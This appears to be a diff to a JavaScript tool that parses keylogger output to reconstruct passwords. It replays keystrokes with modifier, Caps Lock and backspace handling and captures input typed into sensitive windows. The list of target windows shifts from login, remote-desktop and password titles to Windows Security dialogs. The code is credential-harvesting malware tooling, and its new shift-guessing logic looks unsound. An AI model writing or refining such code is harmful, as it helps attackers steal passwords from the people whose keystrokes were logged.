@@ -1616,20 +1616,69 @@ function parsePasswordFromSequence(sequence, initialShift, initialCtrl, initialA
 
     for (const item of sequence) {
         if (item === '[LSHIFT]' || item === '[RSHIFT]') { shift = true; continue; }
-        if (item === '[LSHIFT_RELEASE]' || item === '[RSHIFT_RELEASE]') { shift = false; continue; }
         if (item === '[LCONTROL]' || item === '[RCONTROL]') { ctrl = true; continue; }
-        if (item === '[LCONTROL_RELEASE]' || item === '[RCONTROL_RELEASE]') { ctrl = false; continue; }
         if (item === '[LALT]' || item === '[RALT]') { alt = true; continue; }
-        if (item === '[LALT_RELEASE]' || item === '[RALT_RELEASE]') { alt = false; continue; }
         if (item === '[CAPSLOCK]') { caps = !caps; continue; }
-        if (item.startsWith('[') && item.endsWith(']')) continue; // 忽略其他功能键
-        if (ctrl || alt) continue; // Ctrl/Alt 组合键不视为密码输入
+        
+        // 处理退格键
+        if (item === '[BACKSPACE]' || item === '[BACK]') {
+            if (result.length > 0) {
+                result.pop();
+            }
+            // 重置修饰键状态
+            shift = false;
+            ctrl = false;
+            alt = false;
+            continue;
+        }
+        
+        if (item.startsWith('[') && item.endsWith(']')) {
+            // 遇到其他功能键时，重置修饰键状态
+            shift = false;
+            ctrl = false;
+            alt = false;
+            continue;
+        }
+        if (ctrl || alt) {
+            // Ctrl/Alt 组合键不视为密码输入，重置状态
+            shift = false;
+            ctrl = false;
+            alt = false;
+            continue;
+        }
 
         let char = item;
         if (item.length === 1) {
             const isLetter = /^[a-zA-Z]$/.test(item);
-            const upper = (caps && isLetter) ? !shift : shift;
-            char = upper ? (shiftMap[item] || item.toUpperCase()) : item.toLowerCase();
+            const isUpperCase = /^[A-Z]$/.test(item);
+            const isLowerCase = /^[a-z]$/.test(item);
+            
+            // 大写字母表示需要按下 shift，小写字母表示不需要
+            if (isUpperCase) {
+                // 对于大写字母，强制使用 shift 状态
+                if (isLetter) {
+                    char = item.toUpperCase();
+                } else if (shiftMap[item]) {
+                    char = shiftMap[item];
+                }
+            } else if (isLowerCase) {
+                // 对于小写字母，不使用 shift 状态
+                if (isLetter) {
+                    char = item.toLowerCase();
+                }
+            } else {
+                // 对于数字和特殊字符，检查前一个字符是否是大写字母
+                // 如果前一个字符是大写字母，使用 shift 状态
+                const prevItem = result.length > 0 ? result[result.length - 1] : '';
+                const prevIsUpperCase = /^[A-Z]$/.test(prevItem);
+                
+                if (prevIsUpperCase) {
+                    // 前一个字符是大写字母，使用 shift 状态
+                    if (shiftMap[item]) {
+                        char = shiftMap[item];
+                    }
+                }
+            }
         }
         result.push(char);
     }
@@ -1653,13 +1702,8 @@ function extractPasswordsFromLog(content, filename) {
     // 判断窗口是否为敏感窗口（需要捕获密码）
     const isSensitiveWindow = (winTitle) => {
         const lower = winTitle.toLowerCase();
-        return lower.includes('安全中心') ||
-               lower.includes('登录') ||
-               lower.includes('远程桌面连接') ||
-               lower.includes('keylogger') ||
-               lower.includes('alist') ||
-               lower.includes('password') ||
-               lower.includes('密码');
+        return lower.includes('windows 安全') ||
+               lower.includes('windows 安全中心');
     };
 
     const saveCurrentPassword = () => {
@@ -1714,31 +1758,47 @@ function extractPasswordsFromLog(content, filename) {
         // 将当前行拆分为 tokens 并逐个处理
         const tokens = splitLineIntoTokens(line);
         for (const token of tokens) {
+            // 首先将所有按键添加到原始序列中
+            rawSequence.push(token);
+            
             // 更新修饰键状态（全局追踪）
             if (token === '[LSHIFT]' || token === '[RSHIFT]') { shiftPressed = true; continue; }
-            if (token === '[LSHIFT_RELEASE]' || token === '[RSHIFT_RELEASE]') { shiftPressed = false; continue; }
             if (token === '[LCONTROL]' || token === '[RCONTROL]') { ctrlPressed = true; continue; }
-            if (token === '[LCONTROL_RELEASE]' || token === '[RCONTROL_RELEASE]') { ctrlPressed = false; continue; }
             if (token === '[LALT]' || token === '[RALT]') { altPressed = true; continue; }
-            if (token === '[LALT_RELEASE]' || token === '[RALT_RELEASE]') { altPressed = false; continue; }
             if (token === '[CAPSLOCK]') { capsLock = !capsLock; continue; }
 
             // Tab / Enter 提交密码
             if (token === '[TAB]' || token === '[ENTER]' || token === '[RETURN]') {
                 saveCurrentPassword();
                 rawSequence = [];
+                // 重置修饰键状态
+                shiftPressed = false;
+                ctrlPressed = false;
+                altPressed = false;
                 continue;
             }
 
-            // 退格删除
+            // 退格删除 - 这里不需要从rawSequence中移除，因为我们要保留原始按键记录
             if (token === '[BACKSPACE]' || token === '[BACK]') {
-                rawSequence.pop();
+                // 重置修饰键状态
+                shiftPressed = false;
+                ctrlPressed = false;
+                altPressed = false;
                 continue;
             }
 
-            // 普通字符输入（排除未识别的特殊键）
+            // 遇到其他功能键时，重置修饰键状态
+            if (token.startsWith('[') && token.endsWith(']')) {
+                shiftPressed = false;
+                ctrlPressed = false;
+                altPressed = false;
+                continue;
+            }
+
+            // 普通字符输入
             if (!token.startsWith('[') || !token.endsWith(']')) {
-                rawSequence.push(token);
+                // 字符输入后重置 shift 状态
+                shiftPressed = false;
             }
         }
     }
